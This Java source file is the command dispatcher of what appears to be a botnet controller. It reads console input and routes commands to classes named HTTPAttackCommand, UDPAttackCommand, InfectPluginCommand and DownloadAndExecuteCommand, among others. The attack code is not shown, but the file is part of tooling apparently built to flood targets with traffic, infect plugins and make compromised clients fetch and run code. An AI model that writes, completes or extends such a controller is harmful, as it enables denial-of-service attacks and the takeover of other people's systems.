package net.vitox.command;

import net.vitox.command.commands.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class CommandManager {

    public static ArrayList<Command> commands = new ArrayList<>();
    public static String prefix = ".";
    public BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

    public void initCommands() {
        new Thread(() -> {
            commands.add(new HelpCommand());
            commands.add(new CreateCommand());
            commands.add(new ClientCommand());
            commands.add(new HTTPAttackCommand());
            commands.add(new UDPAttackCommand());
            commands.add(new AttackStopCommand());
            commands.add(new StatisticCommand());
            commands.add(new InfectPluginCommand());
            commands.add(new DownloadAndExecuteCommand());
            commands.add(new StopCommand());
            interpreteCommands();
        }).start();
    }

    public void interpreteCommands() {
        try {
            String command = reader.readLine();
            String[] cmdArgs = command.split(" ");

            for (Command cmd : commands) {
                if (cmdArgs[0].startsWith(prefix + cmd.getCommandName())) {
                    cmd.runCommand(cmdArgs);
                }
            }
            interpreteCommands();
    } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
